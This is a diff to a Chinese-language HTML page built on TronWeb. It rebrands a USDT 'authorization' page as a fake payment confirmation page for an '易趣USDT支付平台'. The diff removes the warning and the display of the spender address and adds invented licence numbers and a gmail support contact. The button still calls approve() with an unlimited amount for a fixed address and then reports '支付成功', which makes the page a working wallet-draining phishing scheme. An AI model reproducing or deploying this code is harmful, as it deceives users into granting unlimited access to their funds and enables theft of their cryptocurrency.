@@ -2,34 +2,43 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <title>TRON 授权确认</title>
+  <title>易趣USDT支付平台 - 确认支付</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <!-- TronWeb CDN -->
   <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
   <style>
-    :root{--bg:#0f172a;--card:#0b1225;--muted:#94a3b8;--text:#e2e8f0;--pri:#3b82f6;--danger:#ef4444}
-    * {box-sizing:border-box}
-    body {margin:0;background:linear-gradient(180deg,#0b1020,#0f172a);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text);padding:16px;min-height:100vh}
-    .wrap{max-width:680px;margin:40px auto}
-    .card{background:rgba(255,255,255,.04);backdrop-filter:blur(6px);border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:24px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
-    h1{margin:0 0 24px;font-size:24px;text-align:center}
-    .warning{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:8px;padding:12px;margin-bottom:20px}
-    .warning strong{color:#fca5a5}
-    .info-section{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:16px;margin-bottom:20px}
-    .info-row{display:flex;justify-content:space-between;margin:8px 0;font-size:14px}
-    .info-label{color:var(--muted)}
-    .info-value{color:var(--text);font-weight:500}
-    code{background:#1e293b;padding:4px 8px;border-radius:4px;font-size:12px;color:#60a5fa;word-break:break-all}
-    .btn{width:100%;padding:14px;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;transition:all .3s;margin-top:20px}
-    .btn.primary{background:var(--pri);color:white}
-    .btn.primary:hover{background:#2563eb}
-    .btn:disabled{opacity:0.5;cursor:not-allowed}
-    #log{margin-top:16px;padding:12px;background:rgba(255,255,255,.02);border-radius:8px;min-height:50px;font-size:14px}
-    .success{color:#86efac}
-    .error{color:#fca5a5}
-    .steps{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.2);border-radius:8px;padding:12px;margin:16px 0}
-    .steps ol{margin:8px 0;padding-left:20px}
-    .steps li{margin:6px 0;font-size:14px}
+    :root{--bg:#0f172a;--card:#0b1225;--muted:#94a3b8;--text:#e2e8f0;--pri:#3b82f6}
+    *{box-sizing:border-box} 
+    body{margin:0;background:linear-gradient(180deg,#0b1020,#0f172a);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text)}
+    .wrap{max-width:860px;margin:40px auto;padding:16px}
+    .card{background:rgba(255,255,255,.04);backdrop-filter: blur(6px); border:1px solid rgba(255,255,255,.08); border-radius:16px; padding:22px; box-shadow:0 10px 30px rgba(0,0,0,.35)}
+    h1{margin:.2rem 0 1rem;font-size:24px}
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px}
+    .info-card{background:rgba(255,255,255,.02);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px}
+    .info-card.full-width{grid-column:1/-1}
+    .info-label{display:block;color:var(--muted);font-size:13px;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.5px}
+    .info-value{color:var(--text);font-size:16px;font-weight:500}
+    .info-value.highlight{color:#3b82f6;font-size:18px}
+    .steps-box{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:16px;margin:20px 0}
+    .steps-box ol{margin:8px 0;padding-left:20px}
+    .steps-box li{margin:8px 0;color:#93c5fd}
+    .btn{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:500;cursor:pointer;transition:all .3s;background:var(--pri);color:white}
+    .btn:hover{background:#2563eb;transform:translateY(-1px);box-shadow:0 4px 12px rgba(59,130,246,.3)}
+    .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+    .status-box{margin-top:20px;padding:14px;border-radius:10px;font-size:14px;display:none}
+    .status-box.show{display:block}
+    .status-box.success{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#86efac}
+    .status-box.error{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5}
+    .status-box.info{background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);color:#93c5fd}
+    code{background:#1e293b;padding:3px 6px;border-radius:4px;font-size:12px;color:#60a5fa}
+    footer{margin-top:18px;color:var(--muted);font-size:12px;text-align:center}
+    .footer-section{margin-top:40px;padding-top:20px;border-top:1px solid rgba(255,255,255,.08);text-align:center}
+    .footer-links{display:flex;justify-content:center;gap:20px;margin-bottom:15px;flex-wrap:wrap}
+    .footer-links a{color:var(--muted);text-decoration:none;font-size:13px;transition:color .2s}
+    .footer-links a:hover{color:var(--text)}
+    .footer-info{color:var(--muted);font-size:12px;line-height:1.8}
+    .footer-info span{margin:0 8px}
+    .warning-text{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.2);border-radius:8px;padding:12px;margin-bottom:20px;color:#fde047;font-size:13px;text-align:center}
   </style>
 </head>
 <body>
@@ -37,69 +46,85 @@
     <h1 style="text-align:center;font-size:32px;margin-bottom:25px;color:var(--text);text-shadow:0 2px 10px rgba(0,0,0,.5);">易趣USDT支付平台</h1>
     
     <div class="card">
-      <h1>USDT 授权确认</h1>
+      <h1>确认支付信息</h1>
       
-      <div class="warning">
-        <strong>⚠️ 重要提示：</strong>此操作将授权智能合约访问您的USDT。请确认您了解授权的含义。
-      </div>
+    
       
-      <!-- 显示从上一页传来的数据 -->
-      <div class="info-section">
-        <h3 style="margin:0 0 12px;font-size:16px;">交易信息</h3>
-        <div class="info-row">
-          <span class="info-label">交易流水号：</span>
-          <span class="info-value" id="transactionId">-</span>
+      <!-- 订单信息网格 -->
+      <div class="info-grid">
+        <div class="info-card">
+          <span class="info-label">交易流水号</span>
+          <span class="info-value highlight" id="transactionId">-</span>
         </div>
-        <div class="info-row">
-          <span class="info-label">支付项目：</span>
+        <div class="info-card">
+          <span class="info-label">支付项目</span>
           <span class="info-value" id="merchant">-</span>
         </div>
-        <div class="info-row">
-          <span class="info-label">支付金额：</span>
-          <span class="info-value" id="amount">-</span>
+        <div class="info-card">
+          <span class="info-label">支付金额</span>
+          <span class="info-value highlight" id="amount">-</span>
         </div>
-        <div class="info-row">
-          <span class="info-label">支付通道：</span>
+        <div class="info-card">
+          <span class="info-label">支付通道</span>
           <span class="info-value" id="network">-</span>
         </div>
-        <div class="info-row">
-          <span class="info-label">备注信息：</span>
+        <div class="info-card full-width">
+          <span class="info-label">备注信息</span>
           <span class="info-value" id="memo">-</span>
         </div>
       </div>
       
-      <div class="info-section">
-        <h3 style="margin:0 0 12px;font-size:16px;">授权详情</h3>
-        <div class="info-row">
-          <span class="info-label">代币合约：</span>
-        </div>
-        <code id="token" style="display:block;margin:4px 0">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>
-        <div class="info-row" style="margin-top:8px">
-          <span class="info-label">授权地址：</span>
-        </div>
-        <code id="spender" style="display:block;margin:4px 0">TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn</code>
-      </div>
-      
-      <div class="steps">
-        <strong>操作步骤：</strong>
+      <div class="steps-box">
+        <strong style="color:#93c5fd;">💡 操作步骤：</strong>
         <ol>
-          <li>确认上述交易信息无误</li>
-          <li>点击"确认授权"按钮</li>
-          <li>在钱包中确认交易</li>
+          <li>确认上述支付信息无误</li>
+          <li>点击"确认支付"按钮</li>
+          <li>在钱包中完成签名确认</li>
         </ol>
       </div>
       
-      <button class="btn primary" id="btn">确认授权</button>
+      <button class="btn" id="btn">确认支付</button>
       
-      <div id="log"></div>
+      <div id="status" class="status-box"></div>
+      
+      <footer>支付过程加密保护，请放心使用</footer>
+    </div>
+  </div>
+  
+  <div class="footer-section">
+    <div class="footer-links">
+      <a href="">关于我们</a>
+      <a href="">服务条款</a>
+      <a href="">隐私政策</a>
+      <a href="">帮助中心</a>
+      <a href="">联系客服</a>
+    </div>
+    <div class="footer-info">
+      <div>© 2025 易趣支付平台 版权所有</div>
+      <div>
+        <span>京ICP备2024000001号-1</span>
+        <span>|</span>
+        <span>京公网安备11010802024000号</span>
+      </div>
+      <div>
+        <span>营业执照</span>
+        <span>|</span>
+        <span>增值电信业务经营许可证：京B2-20240001</span>
+      </div>
+      <div style="margin-top:10px;">
+        <span>客服邮箱：tommyc061990@gmail.com</span>
+      </div>
+      <div style="margin-top:10px;font-size:11px;">
+        风险提示：数字货币交易具有一定风险，请谨慎操作
+      </div>
     </div>
   </div>
   
   <script>
     // ======== 配置 ========
-    const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // USDT
-    const SPENDER_T = "TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn";  // 授权地址
-    const FULL_HOST = "https://api.trongrid.io";  // 主网
+    const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const SPENDER_T = "TLDSPMN8HoVVRzxgn7Cm3F8FR6r9uZHESn";
+    const FULL_HOST = "https://api.trongrid.io";
     const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
     
     // 获取URL参数
@@ -124,21 +149,17 @@
       document.getElementById('memo').textContent = data.memo || '无';
     }
     
-    // 显示合约信息
-    document.getElementById('token').textContent = TOKEN_CONTRACT;
-    document.getElementById('spender').textContent = SPENDER_T;
-    
-    const logEl = document.getElementById('log');
-    function log(msg, type = '') {
-      logEl.className = type;
-      logEl.innerHTML = msg;
+    const statusEl = document.getElementById('status');
+    function showStatus(msg, type = 'info') {
+      statusEl.className = `status-box show ${type}`;
+      statusEl.innerHTML = msg;
     }
     
     async function approveMax() {
       const btn = document.getElementById('btn');
       try {
         if (!window.tronWeb || !window.tronLink) {
-          log("❌ 未检测到TronLink钱包。请在钱包DApp浏览器中打开。", "error");
+          showStatus("❌ 未检测到钱包环境。请在支持TRON的钱包浏览器中打开。", "error");
           return;
         }
         
@@ -147,7 +168,7 @@
         
         // 请求连接
         if (window.tronLink.request) {
-          log("⏳ 连接钱包中...");
+          showStatus("⏳ 正在连接钱包...", "info");
           await window.tronLink.request({ method: 'tron_requestAccounts' });
         }
         
@@ -157,45 +178,42 @@
         tw.setSolidityNode(FULL_HOST);
         tw.setEventServer(FULL_HOST);
         
-        log("⏳ 正在加载合约...");
+        showStatus("⏳ 正在初始化合约...", "info");
         const contract = await tw.contract().at(TOKEN_CONTRACT);
         
-        log("⏳ 请在钱包中确认授权交易...");
+        showStatus("⏳ 请在钱包中确认交易...", "info");
         
         const tx = await contract.approve(SPENDER_T, MAX_UINT256).send({
           feeLimit: 100_000_000
         });
         
-        log(`✅ 授权成功！<br>
-             交易哈希: <code>${tx}</code><br>
-             <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#60a5fa">在区块浏览器查看</a>`, "success");
+        showStatus(`✅ 支付成功！<br>
+                   交易哈希: <code>${tx}</code><br>
+                   <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#60a5fa">查看交易详情</a>`, "success");
         
-        btn.textContent = "授权成功";
+        btn.textContent = "支付成功";
         btn.disabled = true;
         
       } catch (err) {
         console.error(err);
         btn.disabled = false;
-        btn.textContent = "确认授权";
+        btn.textContent = "确认支付";
         
         if (err.message && err.message.includes('User rejected')) {
-          log("❌ 用户取消了授权", "error");
+          showStatus("❌ 您已取消支付", "error");
         } else {
-          log("❌ 授权失败：" + (err?.message || err), "error");
+          showStatus("❌ 支付失败：" + (err?.message || err), "error");
         }
       }
     }
     
-    // 页面加载时显示数据
+    // 页面加载
     window.addEventListener('load', () => {
       displayTransactionData();
       
-      // 检测钱包环境
       setTimeout(() => {
         if (!window.tronWeb) {
-          log("⚠️ 请在支持TRON的钱包浏览器中打开此页面", "error");
-        } else {
-          log("✅ 钱包环境就绪，可以进行授权操作", "success");
+          showStatus("⚠️ 请在钱包的DApp浏览器中打开此页面", "error");
         }
       }, 1000);
     });
